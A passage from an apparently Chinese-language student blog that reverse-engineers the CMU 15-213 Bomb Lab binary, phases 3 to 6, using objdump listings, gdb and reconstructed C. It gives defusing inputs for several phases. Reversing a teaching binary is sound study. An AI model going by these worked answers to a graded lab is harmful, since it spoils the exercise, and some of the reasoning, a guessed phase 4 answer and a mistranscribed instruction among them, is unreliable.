0xc(%rsp),%eax\n  400fc2:\t74 05                \tje     400fc9 &lt;phase_3+0x86&gt;\n  400fc4:\te8 71 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n</code></pre>\n<p>这段代码中实现如下操作：</p>\n<ol>\n<li>eax &#x3D; 0x137</li>\n<li>如果<code>eax != *(rsp + 12)</code>，那么炸弹爆炸，也就是说输入的第二个参数最后必须等于<code>0x137</code></li>\n</ol>\n<p>现在问题来了，有几个代码通过跳转来到了<code>400fbe</code>位置，我们需要分析其情况，看看其是否对<code>%rsp + 12</code>处的值做了操作。</p>\n<pre><code>  400f7c:\tb8 cf 00 00 00       \tmov    $0xcf,%eax -&gt;eax = 0xcf\n  400f81:\teb 3b                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f83:\tb8 c3 02 00 00       \tmov    $0x2c3,%eax -&gt; eax = 0x2c3\n  400f88:\teb 34                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f8a:\tb8 00 01 00 00       \tmov    $0x100,%eax -&gt; eax = 0x100\n  400f8f:\teb 2d                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f91:\tb8 85 01 00 00       \tmov    $0x185,%eax -&gt; eax = 0x185\n  400f96:\teb 26                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f98:\tb8 ce 00 00 00       \tmov    $0xce,%eax -&gt; eax = 0xce\n  400f9d:\teb 1f                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400f9f:\tb8 aa 02 00 00       \tmov    $0x2aa,%eax -&gt; eax = 0x2aa\n  400fa4:\teb 18                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400fa6:\tb8 47 01 00 00       \tmov    $0x147,%eax -&gt; eax = 0x147\n  400fab:\teb 11                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n\n  400fad:\te8 88 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  400fb2:\tb8 00 00 00 00       \tmov    $0x0,%eax -&gt; eax = 0\n  400fb7:\teb 05                \tjmp    400fbe &lt;phase_3+0x7b&gt;\n  400fb9:\tb8 37 01 00 00       \tmov    $0x137,%eax -&gt; eax = 0x137\n\n  400fbe:\t3b 44 24 0c          \tcmp    0xc(%rsp),%eax\n  400fc2:\t74 05                \tje     400fc9 &lt;phase_3+0x86&gt;\n  400fc4:\te8 71 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n</code></pre>\n<p>要注意的是指令<code>400f75:\tff 24 c5 70 24 40 00 \tjmpq   *0x402470(,%rax,8)</code>中实现的是间接跳转（因为加了<code>*</code>），那么我们需要找到<code>0x402470</code>处的 8 字节地址，以它为跳转的基地址。</p>\n<pre><code>(gdb) x/wx 0x402470\n0x402470:       0x00400f7c\n</code></pre>\n<p>这个地址就是<code>0x400f7c</code>。我们前面把输入的第一个数字移到了<code>%eax</code>，那么我们需要通过<code>0x400f7c + 8 * %eax</code>来确定我们的跳转目标。跳转以后会赋给<code>%eax</code>相应的值，而后我们需要保证我们输入的第二个数等于<code>%eax</code>。</p>\n<p>这样逻辑就捋顺了，整个代码应该是一个<code>switch_case</code>的结构，而<code>0x400f7c</code>就是这个跳转表的首地址，<code>%eax</code>是对应的索引。这个<code>phase</code>的要求就是：</p>\n<ol>\n<li>输入 2 个整数</li>\n<li>第一个整数必须小于等于 0x7，因为最多只有 7 个<code>case</code></li>\n<li>输入的第二个数必须和其<code>case</code>中赋给<code>%eax</code>的值相同</li>\n</ol>\n<p>我们设计第一个数是<code>0</code>，那么第二个数就是<code>0xcf</code>(<code>207</code>)，我们试一试：</p>\n<pre><code>main (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at bomb.c:90\n90          /* I guess this is too easy so far.  Some more complex code will\n(gdb) n\n91           * confuse people. */\n(gdb) n\nHalfway there!\n94          phase_defused();\n</code></pre>\n<p>成功！</p>\n<h2 id=\"phase4-分析：递归\"><a href=\"#phase4-分析：递归\" class=\"headerlink\" title=\"phase4 分析：递归\"></a>phase4 分析：递归</h2><p>首先还是对<code>phase_4</code>进行了反汇编：</p>\n<pre><code>000000000040100c &lt;phase_4&gt;:\n  40100c:\t48 83 ec 18          \tsub    $0x18,%rsp\n  401010:\t48 8d 4c 24 0c       \tlea    0xc(%rsp),%rcx\n  401015:\t48 8d 54 24 08       \tlea    0x8(%rsp),%rdx\n  40101a:\tbe cf 25 40 00       \tmov    $0x4025cf,%esi\n  40101f:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401024:\te8 c7 fb ff ff       \tcallq  400bf0 &lt;__isoc99_sscanf@plt&gt;\n  401029:\t83 f8 02             \tcmp    $0x2,%eax\n  40102c:\t75 07                \tjne    401035 &lt;phase_4+0x29&gt;\n\n  40102e:\t83 7c 24 08 0e       \tcmpl   $0xe,0x8(%rsp)\n  401033:\t76 05                \tjbe    40103a &lt;phase_4+0x2e&gt;\n  401035:\te8 00 04 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  40103a:\tba 0e 00 00 00       \tmov    $0xe,%edx\n  40103f:\tbe 00 00 00 00       \tmov    $0x0,%esi\n  401044:\t8b 7c 24 08          \tmov    0x8(%rsp),%edi\n  401048:\te8 81 ff ff ff       \tcallq  400fce &lt;func4&gt;\n  40104d:\t85 c0                \ttest   %eax,%eax\n  40104f:\t75 07                \tjne    401058 &lt;phase_4+0x4c&gt;\n  401051:\t83 7c 24 0c 00       \tcmpl   $0x0,0xc(%rsp)\n  401056:\t74 05                \tje     40105d &lt;phase_4+0x51&gt;\n\n  401058:\te8 dd 03 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n  40105d:\t48 83 c4 18          \tadd    $0x18,%rsp\n  401061:\tc3                   \tretq\n</code></pre>\n<p>在本代码中进行了如下过程：</p>\n<ol>\n<li>预留出 24 个字节的空间</li>\n<li>rcx &#x3D; rsp + 12</li>\n<li>rdx &#x3D; rsp + 8</li>\n<li>esi &#x3D; 0x4025cf</li>\n<li>eax &#x3D; 0</li>\n<li>sscanf 调用</li>\n<li>下面是带分支部分：</li>\n</ol>\n<pre><code class=\"c\">if(eax != 0x2) &#123;\n    call bomb_explode\n&#125;\nif(arg3 &gt; 0xe) &#123;\n    call bomb_explode\n&#125;\nedx = 0xe;\nesi = 0x0;\nedi = arg3\nret = func4(arg1,arg2,arg3)\nif(eax != 0)\n    call bomb_explode\nif(arg2 == 0)\n    return eax;\nelse\n    call bomb_explode\n</code></pre>\n<p>这里出现了非常熟悉的<code>sscanf</code>调用，我们先看看<code>0x4025cf</code>处是啥（如果不出意外应该是<code>%d %d</code>）</p>\n<pre><code>(gdb) x/s 0x4025cf\n0x4025cf:       &quot;%d %d&quot;\n</code></pre>\n<p>果然！果然！是让我们输入 2 个整数，如果不是两个的话就爆炸！此外，一开始的<code>arg3</code>应该小于等于<code>0xe</code>，否则爆炸，此外函数<code>func4</code>返回的<code>eax</code>应该为 0，否则爆炸。此外，<code>*(rsp + 12)</code>（如果<code>func4</code>里面没改变这个值的话应该还是<code>arg2</code>）必须等于 0。</p>\n<p>那么我们来分析一下<code>func4</code>：</p>\n<pre><code>0000000000400fce &lt;func4&gt;:\n  400fce:\t48 83 ec 08          \tsub    $0x8,%rsp\n  400fd2:\t89 d0                \tmov    %edx,%eax\n  400fd4:\t29 f0                \tsub    %esi,%eax\n  400fd6:\t89 c1                \tmov    %eax,%ecx\n  400fd8:\tc1 e9 1f             \tshr    $0x1f,%ecx\n  400fdb:\t01 c8                \tadd    %ecx,%eax\n  400fdd:\td1 f8                \tsar    %eax\n  400fdf:\t8d 0c 30             \tlea    (%rax,%rsi,1),%ecx\n  400fe2:\t39 f9                \tcmp    %edi,%ecx\n  400fe4:\t7e 0c                \tjle    400ff2 &lt;func4+0x24&gt;\n\n  400fe6:\t8d 51 ff             \tlea    -0x1(%rcx),%edx\n  400fe9:\te8 e0 ff ff ff       \tcallq  400fce &lt;func4&gt;\n  400fee:\t01 c0                \tadd    %eax,%eax\n  400ff0:\teb 15                \tjmp    401007 &lt;func4+0x39&gt;\n\n  400ff2:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  400ff7:\t39 f9                \tcmp    %edi,%ecx\n  400ff9:\t7d 0c                \tjge    401007 &lt;func4+0x39&gt;\n\n  400ffb:\t8d 71 01             \tlea    0x1(%rcx),%esi\n  400ffe:\te8 cb ff ff ff       \tcallq  400fce &lt;func4&gt;\n  401003:\t8d 44 00 01          \tlea    0x1(%rax,%rax,1),%eax\n\n  401007:\t48 83 c4 08          \tadd    $0x8,%rsp\n  40100b:\tc3                   \tretq\n</code></pre>\n<p>看起来有点长，但是不要惊慌！这里只有 3 个跳转，而且其中两个都是跳转到最后恢复栈的位置。其主要步骤如下：</p>\n<ol>\n<li>分配 8 个字节的栈空间</li>\n<li>eax &#x3D; edx</li>\n<li>eax -&#x3D; esi<br>-&gt; eax &#x3D; edx - esi</li>\n<li>ecx &#x3D; eax</li>\n<li>ecx &gt;&gt; 31<br>-&gt; ecx &#x3D; eax &gt;&gt; 31(eax 符号位拉满)</li>\n<li>eax +&#x3D; ecx</li>\n<li>eax &gt;&gt; 1<br>-&gt; eax &#x3D; (eax + ecx) &gt;&gt; 1</li>\n<li>ecx &#x3D; rax + rsi</li>\n<li>下面进入一段分支：</li>\n</ol>\n<pre><code class=\"c\">if(ecx &lt;= edi) &#123;\n    //400ff2\n    eax = 0;\n    if(ecx &gt;= edi) &#123;\n        // 401007\n        return rax;\n    &#125;\n    else&#123;\n        esi = rcx + 0x1;\n        ret = func4(arg1,arg2,arg3)\n        eax = rax + rax + 1;\n        return rax;\n    &#125;\n&#125;\nelse &#123;\n    edx = rcx - 0x1;\n    ret = func4(arg1,arg2,arg3)\n    eax = eax * 2;\n    return rax;\n&#125;\n</code></pre>\n<p>分析<code>func4</code>，我们不难发现，该函数的传入参数是<code>%edx</code>和<code>%esi</code>，此外该函数是个递归函数。函数总的过程应该如下：</p>\n<pre><code class=\"c\">eax = edx - esi\necx = eax &gt;&gt; 31 (逻辑右移)\neax = (eax + ecx) &gt;&gt; 1 (算数右移)\necx = rax + rsi\nif(ecx &lt;= edi) &#123;\n   eax = 0;\n   if(ecx &gt;= edi) &#123;\n       // 401007\n       return rax;\n   &#125;\n   else&#123;\n       esi = rcx + 0x1;\n       ret = func4(arg1,arg2,arg3)\n       eax = rax * 2 + 1;\n       return rax;\n   &#125;\n&#125;\nelse &#123;\n   edx = rcx - 0x1;\n   ret = func4(arg1,arg2,arg3)\n   eax = eax * 2;\n   return rax;\n&#125;\n</code></pre>\n<p>经过变量调整重写的 C 版本如下：</p>\n<pre><code class=\"c\">ret = arg3 - arg2\nmid = ret &gt;&gt; 31\nret = (ret + ret &gt;&gt; 31) / 2;\nmid = ret + arg2\nif(mid &lt;= arg1) &#123;\n   ret = 0;\n   if(mid &gt;= arg1) &#123;\n       return ret;\n   &#125;\n   else&#123;\n    //    arg2 = mid + 1;\n       return func4(arg1,mid + 1,arg3) * 2 + 1;\n   &#125;\n&#125;\nelse &#123;\n//    arg3 = mid - 1;\n   return func4(arg1,arg2,mid - 1) * 2;\n&#125;\n</code></pre>\n<p>我们看看什么情况下<code>eax = 0</code>。（这到底是什么东西啊摔！）真没看懂是什么东西，试了个<code>0 0</code>，通过了，先 mark 一下，后面再来检验：</p>\n<pre><code>(gdb)\n0 0\n95          printf(&quot;Halfway there!\\n&quot;);\n</code></pre>\n<h2 id=\"phase5-分析-canary，循环与-ASCII-编码字符串\"><a href=\"#phase5-分析-canary，循环与-ASCII-编码字符串\" class=\"headerlink\" title=\"phase5 分析: canary，循环与 ASCII 编码字符串\"></a>phase5 分析: <code>canary</code>，循环与 ASCII 编码字符串</h2><pre><code>(gdb)\n97          /* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */\n</code></pre>\n<p>数学不好呜呜呜。</p>\n<p>phase_5 的反汇编代码如下：</p>\n<pre><code>0000000000401062 &lt;phase_5&gt;:\nseg1:\n  401062:\t53                   \tpush   %rbx\n  401063:\t48 83 ec 20          \tsub    $0x20,%rsp\n  401067:\t48 89 fb             \tmov    %rdi,%rbx\n  40106a:\t64 48 8b 04 25 28 00 \tmov    %fs:0x28,%rax\n  401071:\t00 00\n  401073:\t48 89 44 24 18       \tmov    %rax,0x18(%rsp)\n  401078:\t31 c0                \txor    %eax,%eax\n  40107a:\te8 9c 02 00 00       \tcallq  40131b &lt;string_length&gt;\n  40107f:\t83 f8 06             \tcmp    $0x6,%eax\n  401082:\t74 4e                \tje     4010d2 &lt;phase_5+0x70&gt;\n  401084:\te8 b1 03 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  401089:\teb 47                \tjmp    4010d2 &lt;phase_5+0x70&gt;\nseg2:\n  40108b:\t0f b6 0c 03          \tmovzbl (%rbx,%rax,1),%ecx\n  40108f:\t88 0c 24             \tmov    %cl,(%rsp)\n  401092:\t48 8b 14 24          \tmov    (%rsp),%rdx\n  401096:\t83 e2 0f             \tand    $0xf,%edx\n  401099:\t0f b6 92 b0 24 40 00 \tmovzbl 0x4024b0(%rdx),%edx\n  4010a0:\t88 54 04 10          \tmov    %dl,0x10(%rsp,%rax,1)\n  4010a4:\t48 83 c0 01          \tadd    $0x1,%rax\n  4010a8:\t48 83 f8 06          \tcmp    $0x6,%rax\n  4010ac:\t75 dd                \tjne    40108b &lt;phase_5+0x29&gt;\n  4010ae:\tc6 44 24 16 00       \tmovb   $0x0,0x16(%rsp)\n  4010b3:\tbe 5e 24 40 00       \tmov    $0x40245e,%esi\n  4010b8:\t48 8d 7c 24 10       \tlea    0x10(%rsp),%rdi\n  4010bd:\te8 76 02 00 00       \tcallq  401338 &lt;strings_not_equal&gt;\n  4010c2:\t85 c0                \ttest   %eax,%eax\n  4010c4:\t74 13                \tje     4010d9 &lt;phase_5+0x77&gt;\n  4010c6:\te8 6f 03 00 00       \tcallq  40143a &lt;explode_bomb&gt;\n\n  4010cb:\t0f 1f 44 00 00       \tnopl   0x0(%rax,%rax,1)\n  4010d0:\teb 07                \tjmp    4010d9 &lt;phase_5+0x77&gt;\nseg3:\n  4010d2:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  4010d7:\teb b2                \tjmp    40108b &lt;phase_5+0x29&gt;\nseg4:\n  4010d9:\t48 8b 44 24 18       \tmov    0x18(%rsp),%rax\n  4010de:\t64 48 33 04 25 28 00 \txor    %fs:0x28,%rax\n  4010e5:\t00 00\n  4010e7:\t74 05                \tje     4010ee &lt;phase_5+0x8c&gt;\n  4010e9:\te8 42 fa ff ff       \tcallq  400b30 &lt;__stack_chk_fail@plt&gt;\nseg5:\n  4010ee:\t48 83 c4 20          \tadd    $0x20,%rsp\n  4010f2:\t5b                   \tpop    %rbx\n  4010f3:\tc3                   \tretq\n</code></pre>\n<p>整个过程还原为 C 语言如下：</p>\n<pre><code class=\"c\">// 这个函数的参数是： %rdi\nint phase5(char* buf)\n&#123;\n    // 保存 rbx\n    // 留出 32 个字节的空间\n    rbx = rdi // buf 的地址保存在 rbx 中\n    *(rsp + 24) = canary\n    eax = 0 // 返回值 = 0\n    call string_length // 返回字符串长度\n    if(eax == 0x6) &#123;\n        eax = 0\n\n        // //seg2\n        // ecx = *(rbx + rax)\n        // *rsp = cl\n        // rdx = *rsp\n        // edx = edx &amp; 0xf\n        // edx = *(rdx + 0x4024b0)\n        // *(rsp + rax + 16) = dl\n        // rax = rax &amp; 0x1\n        // if(rax != 0x6)\n        // \tjump to seg2\n\n        // seg2 应该是个循环，其格式如下：\n        do &#123;\n            ecx = *(rbx + rax) -&gt; 把(str+i)指向的4个字节赋给ecx\n            *rsp = cl -&gt; rsp指向处存储ecx的最低一个字节\n            rdx = *rsp -&gt; rdx = 最低的那个字节\n            edx = edx &amp; 0xf -&gt; edx = 最低4位\n            edx = *(rdx + 0x4024b0) -&gt; edx = *(最低四位 + 0x4024b0)\n            *(rsp + rax + 16) = dl -&gt; rsp[i + 16] = edx的最低四位\n            rax = rax + 0x1 -&gt; rax 递增\n        &#125;while(rax != 0x6);\n\n        *(rsp + 22) = 0 -&gt; rsp[22] = 0 // 字符串的末尾是`\\0`\n        esi = 0x40245e\n        rdi = rsp + 16\n        call strings_not_equal // 判断 esi处的字符串和 rsp + 16处的6个字节的字符串是否相等\n        if(eax == 0) &#123;\n            // seg4\n            rax = *(rsp + 24) // canary\n            // compare rax and canary\n            if(rax == canary) &#123;\n                //seg5\n                // release the stack\n                return rax;\n            &#125;\n            else &#123;\n                call __stack_chk_fail\n            &#125;\n        &#125;else &#123;\n            call bomb_explode\n        &#125;\n    &#125;\n    else &#123;\n        call bomb_explode\n    &#125;\n&#125;\n</code></pre>\n<p><code>0x40245e</code>处的字符串如下：</p>\n<pre><code>(gdb) x/s 0x40245e\n0x40245e:       &quot;flyers&quot;\n</code></pre>\n<p>从上面的内容中我们可以看出：</p>\n<ol>\n<li>必须输入 6 个字符长度的字符串，否则炸弹爆炸</li>\n<li><code>rsp + 16</code>处的字符串和<code>0x40245e</code>处的字符串<code>flyers</code>相同。</li>\n<li>我们需要计算一下 seg2 那段到底对字符串做了什么操作：<code>edx的值 = *(0x4024b0 + str[i]的最低4位)</code>，然后<code>str[i] = edx最低四位</code></li>\n<li>最后<code>str</code>需要等于<code>flyers</code>，也就是说<code>*(0x4024b0 + str[i]的最低4位)的最低4位 = flyers</code></li>\n</ol>\n<p>其中<code>flyers</code>的编码为：<code>0x40245e:       0x66    0x6c    0x79    0x65    0x72    0x73    0x00</code>，最后一个<code>0x00</code>在程序中手动设置了，所以无需自己设置。</p>\n<p>打印一下<code>0x4024b0</code>开始的字符串：<code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code></p>\n<p>因此，本题的目的是在<code>0x4024b0</code>开始的字符串中拼凑出<code>flyers</code>，然后把每个字符相对于开头的偏移量计算出来。其几个字符的地址分别是：</p>\n<ol>\n<li><code>f</code>:0x09</li>\n<li><code>l</code>:0x0f</li>\n<li><code>y</code>:0x0e</li>\n<li><code>ers</code>:0x05 0x06 0x07</li>\n</ol>\n<p>综合起来是：<code>0x09 0x0f 0x0e 0x05 0x06 0x07</code>。我们来试一下<code>*(0x4024b0 + str[i]的最低4位)</code>是否等于<code>flyers</code>。测试出来是这样的。但是这 6 个字节不是字符，为了凑成字符，我们对每个数字加上 64（因为在计算的时候只取最低 4 位，所以对一个字节加上 64 不影响最后的偏移量），得到<code>73, 79,78, 69, 70, 71</code>(这里是 10 进制)，其对应的 ASCII 码是<code>IONEFG</code>。</p>\n<h2 id=\"phase6-分析-超级无敌杂糅嵌套多层循环\"><a href=\"#phase6-分析-超级无敌杂糅嵌套多层循环\" class=\"headerlink\" title=\"phase6 分析: 超级无敌杂糅嵌套多层循环\"></a>phase6 分析: 超级无敌杂糅嵌套多层循环</h2><p>phase_6 反汇编如下（哎哟我滴妈呀咋个这么长啊）：</p>\n<pre><code>00000000004010f4 &lt;phase_6&gt;:\nseg1:\n  4010f4:\t41 56                \tpush   %r14\n  4010f6:\t41 55                \tpush   %r13\n  4010f8:\t41 54                \tpush   %r12\n  4010fa:\t55                   \tpush   %rbp\n  4010fb:\t53                   \tpush   %rbx\n  4010fc:\t48 83 ec 50          \tsub    $0x50,%rsp\n  401100:\t49 89 e5             \tmov    %rsp,%r13\n  401103:\t48 89 e6             \tmov    %rsp,%rsi\n  401106:\te8 51 03 00 00       \tcallq  40145c &lt;read_six_numbers&gt;\n  40110b:\t49 89 e6             \tmov    %rsp,%r14\n  40110e:\t41 bc 00 00 00 00    \tmov    $0x0,%r12d\nseg2:\n  401114:\t4c 89 ed             \tmov    %r13,%rbp\n  401117:\t41 8b 45 00          \tmov    0x0(%r13),%eax\n  40111b:\t83 e8 01             \tsub    $0x1,%eax\n  40111e:\t83 f8 05             \tcmp    $0x5,%eax\n  401121:\t76 05                \tjbe    401128 &lt;phase_6+0x34&gt;\n  401123:\te8 12 03 00 00       \tcallq  40143a &lt;explode_bomb&gt;\nseg3:\n  401128:\t41 83 c4 01          \tadd    $0x1,%r12d\n  40112c:\t41 83 fc 06          \tcmp    $0x6,%r12d\n  401130:\t74 21                \tje     401153 &lt;phase_6+0x5f&gt;\n  401132:\t44 89 e3             \tmov    %r12d,%ebx\nseg4:\n  401135:\t48 63 c3             \tmovslq %ebx,%rax\n  401138:\t8b 04 84             \tmov    (%rsp,%rax,4),%eax\n  40113b:\t39 45 00             \tcmp    %eax,0x0(%rbp)\n  40113e:\t75 05                \tjne    401145 &lt;phase_6+0x51&gt;\n  401140:\te8 f5 02 00 00       \tcallq  40143a &lt;explode_bomb&gt;\nseg5:\n  401145:\t83 c3 01             \tadd    $0x1,%ebx\n  401148:\t83 fb 05             \tcmp    $0x5,%ebx\n  40114b:\t7e e8                \tjle    401135 &lt;phase_6+0x41&gt;\n  40114d:\t49 83 c5 04          \tadd    $0x4,%r13\n  401151:\teb c1                \tjmp    401114 &lt;phase_6+0x20&gt;\nseg6:\n  401153:\t48 8d 74 24 18       \tlea    0x18(%rsp),%rsi\n  401158:\t4c 89 f0             \tmov    %r14,%rax\n  40115b:\tb9 07 00 00 00       \tmov    $0x7,%ecx\nseg7:\n  401160:\t89 ca                \tmov    %ecx,%edx\n  401162:\t2b 10                \tsub    (%rax),%edx\n  401164:\t89 10                \tmov    %edx,(%rax)\n  401166:\t48 83 c0 04          \tadd    $0x4,%rax\n  40116a:\t48 39 f0             \tcmp    %rsi,%rax\n  40116d:\t75 f1                \tjne    401160 &lt;phase_6+0x6c&gt;\n  40116f:\tbe 00 00 00 00       \tmov    $0x0,%esi\n  401174:\teb 21                \tjmp    401197 &lt;phase_6+0xa3&gt;\nseg8:\n  401176:\t48 8b 52 08          \tmov    0x8(%rdx),%rdx\n  40117a:\t83 c0 01             \tadd    $0x1,%eax\n  40117d:\t39 c8                \tcmp    %ecx,%eax\n  40117f:\t75 f5                \tjne    401176 &lt;phase_6+0x82&gt;\n  401181:\teb 05                \tjmp    401188 &lt;phase_6+0x94&gt;\nseg9:\n  401183:\tba d0 32 60 00       \tmov    $0x6032d0,%edx\nseg10:\n  401188:\t48 89 54 74 20       \tmov    %rdx,0x20(%rsp,%rsi,2)\n  40118d:\t48 83 c6 04          \tadd    $0x4,%rsi\n  401191:\t48 83 fe 18          \tcmp    $0x18,%rsi\n  401195:\t74 14                \tje     4011ab &lt;phase_6+0xb7&gt;\nseg11:\n  401197:\t8b 0c 34             \tmov    (%rsp,%rsi,1),%ecx\n  40119a:\t83 f9 01             \tcmp    $0x1,%ecx\n  40119d:\t7e e4                \tjle    401183 &lt;phase_6+0x8f&gt;\n  40119f:\tb8 01 00 00 00       \tmov    $0x1,%eax\n  4011a4:\tba d0 32 60 00       \tmov    $0x6032d0,%edx\n  4011a9:\teb cb                \tjmp    401176 &lt;phase_6+0x82&gt;\nseg12:\n  4011ab:\t48 8b 5c 24 20       \tmov    0x20(%rsp),%rbx\n  4011b0:\t48 8d 44 24 28       \tlea    0x28(%rsp),%rax\n  4011b5:\t48 8d 74 24 50       \tlea    0x50(%rsp),%rsi\n  4011ba:\t48 89 d9             \tmov    %rbx,%rcx\nseg13:\n  4011bd:\t48 8b 10             \tmov    (%rax),%rdx\n  4011c0:\t48 89 51 08          \tmov    %rdx,0x8(%rcx)\n  4011c4:\t48 83 c0 08          \tadd    $0x8,%rax\n  4011c8:\t48 39 f0             \tcmp    %rsi,%rax\n  4011cb:\t74 05                \tje     4011d2 &lt;phase_6+0xde&gt;\n  4011cd:\t48 89 d1             \tmov    %rdx,%rcx\n  4011d0:\teb eb                \tjmp    4011bd &lt;phase_6+0xc9&gt;\nseg14:\n  4011d2:\t48 c7 42 08 00 00 00 \tmovq   $0x0,0x8(%rdx)\n  4011d9:\t00\n  4011da:\tbd 05 00 00 00       \tmov    $0x5,%ebp\nseg15:\n  4011df:\t48 8b 43 08          \tmov    0x8(%rbx),%rax\n  4011e3:\t8b 00                \tmov    (%rax),%eax\n  4011e5:\t39 03                \tcmp    %eax,(%rbx)\n  4011e7:\t7d 05                \tjge    4011ee &lt;phase_6+0xfa&gt;\n  4011e9:\te8 4c 02 00 00       \tcallq  40143a &lt;explode_bomb&gt;\nseg16:\n  4011ee:\t48 8b 5b 08          \tmov    0x8(%rbx),%rbx\n  4011f2:\t83 ed 01             \tsub    $0x1,%ebp\n  4011f5:\t75 e8                \tjne    4011df &lt;phase_6+0xeb&gt;\n  4011f7:\t48 83 c4 50          \tadd    $0x50,%rsp\n  4011fb:\t5b                   \tpop    %rbx\n  4011fc:\t5d                   \tpop    %rbp\n  4011fd:\t41 5c                \tpop    %r12\n  4011ff:\t41 5d                \tpop    %r13\n  401201:\t41 5e                \tpop    %r14\n  401203:\tc3                   \tretq   s\n</code></pre>\n<p>我们将其分为 16 个 seg，然后绘制一下函数流程图试试，总体过程如图</p>\n<p><img data-src=\"/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/phase6.png\" alt=\"图\">。</p>\n<p>然后，我们为了减小每步分析的工作量，根据跳转分支将其分为 6 个过程，如图</p>\n<p><img data-src=\"/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/segs.png\" alt=\"图\"></p>\n<p>下面我们对这 6 个过程来进行分析：</p>\n<h3 id=\"Proc-1\"><a href=\"#Proc-1\" class=\"headerlink\" title=\"Proc 1\"></a>Proc 1</h3><p>首先进入的是 seg1，其做的工作是：</p>\n<ol>\n<li>压入<code>r14 r13 r12 rbp rbx</code></li>\n<li>留出 80 个字节的空间</li>\n<li><code>r13 = rsp = rsi</code></li>\n<li>调用<code>call_six_numbers</code>，经前文分析，<code>read_six_numbers</code>的传入参数为<code>%rsi</code>，返回值在<code>%eax</code>中，其存储了读入的数字的个数</li>\n<li><code>r14 = rsp = rsi = r13</code>，<code>r12d = 0</code></li>\n</ol>\n<p>下面进入 seg 2，其做的工作是：</p>\n<ol>\n<li>让<code>rbp = r13</code>，那么现在<code>r13 = r14 = rsi = rsp = rbp</code></li>\n<li>让<code>eax = r13所指向的值</code></li>\n<li>判断<code>eax - 1</code>是否小于等于 5，如果<code>eax - 1 &gt; 5</code>，那么炸弹爆炸，也就是说<code>eax</code>必须小于等于 6</li>\n<li>正常情况下，进入 seg 3</li>\n</ol>\n<p>进入 seg 3 分析：</p>\n<ol>\n<li><code>r12d += 1</code></li>\n<li>将<code>r12d</code>与 6 比较，如果<code>r12d ！= 6</code>，那么<code>ebx = r12d</code>，随后进入 seg 4(proc 2 中)</li>\n<li>否则就进入 seg 6(proc 3 中)</li>\n</ol>\n<p>这里我们分析得到的结果是：</p>\n<ol>\n<li>seg 1 中进行了一些初始化的工作，让几个指针都指向输入数字的起始位置，并且让计数值<code>r12d = 0</code></li>\n<li>seg 2 中让<code>rbp 指向 r13所指向的位置</code>(一开始<code>r13 = r14 = rsp = rsi</code>，因为后面还有进入<code>seg 2</code>的部分，所以不确定<code>r13</code>的指向会不会改变，先看看)，让<code>eax = r13所指向的值</code>，并且保证其必须小于等于 6</li>\n<li>seg 3 中让<code>r12d</code>计数值增加，判断<code>r12d是否等于6</code>。如果不等于 6，就让其等于<code>ebx</code>，然后进入<code>seg 4</code>；否则进<code>seg 6</code>（看流程图可以看出，seg 6 离终点要更进一步，而 seg 4 在进入后做一些循环的工作后又会回到 seg 2，故我猜测这里 seg 4 以后的步骤是做了一些遍历的工作，但是在遍历的而过程中是读还是修改暂不清楚）</li>\n</ol>\n<h3 id=\"Proc-2\"><a href=\"#Proc-2\" class=\"headerlink\" title=\"Proc 2\"></a>Proc 2</h3><p>接下来我们进入 seg 4：</p>\n<ol>\n<li>我们首先让<code>rax = ebx</code>(注意前面<code>ebx = r12d</code>,此时<code>r12d</code>已经递增到下一个位置了)，那么这里<code>rax = ebx = r12d</code></li>\n<li>让<code>eax = *(rsp + 4 * rax)</code>，因为 rsp 是输入数字的起始位置，那么 rax 应该是一个索引，因为输入的是<code>int</code>类型，所以每次要 <code>* 4</code>。假定输入的数字的字符串叫<code>str</code>，那么这里就是<code>eax = str[rax]</code></li>\n<li>判断<code>rbp 指向的值是否等于eax</code>，前文中我们可以看到<code>rbp</code>指向的是<code>r13</code>所指向的位置，也就是让你判断<code>r13</code>指向位置的值是否等于<code>eax</code>，也就是前面的<code>str[rax]</code></li>\n<li>如果不相等，进入 seg 5，否则炸弹爆炸(下面那个图中的有点错误，菱锌框中应该是不相等)，我们可以初步判断，这里两个相邻的值应该是不能相等的（其他不相邻的能不能相等等会儿再看，如果<code>r13</code>改变的话，那么不相邻的值应该也不能像等）</li>\n</ol>\n<p>就接下来我们进入 seg 5：</p>\n<ol>\n<li><code>ebx += 1</code>（还记得<code>ebx</code>是什么吗？<code>ebx = r12d</code>！在前文中<code>r12d</code>已经向前跃进了一个位置，那么现在<code>ebx</code>还要比<code>r12d</code>再进一个位置）</li>\n<li>将<code>ebx 和 0x5</code>相比较，如果<code>ebx &lt;= 0x5</code>，也就是说如果之前的<code>ebx &lt;= 0x6</code>的话，继续回到 seg 4。否则<code>r13 += 4</code>（<code>r13</code>果然改变了，向前跃进了 4 个字节，也就是一个 int 类型的大小），然后回到 seg 2</li>\n</ol>\n<p>这个过程我们分析得到的结果是：</p>\n<ol>\n<li>seg 4 让<code>rax = ebx = 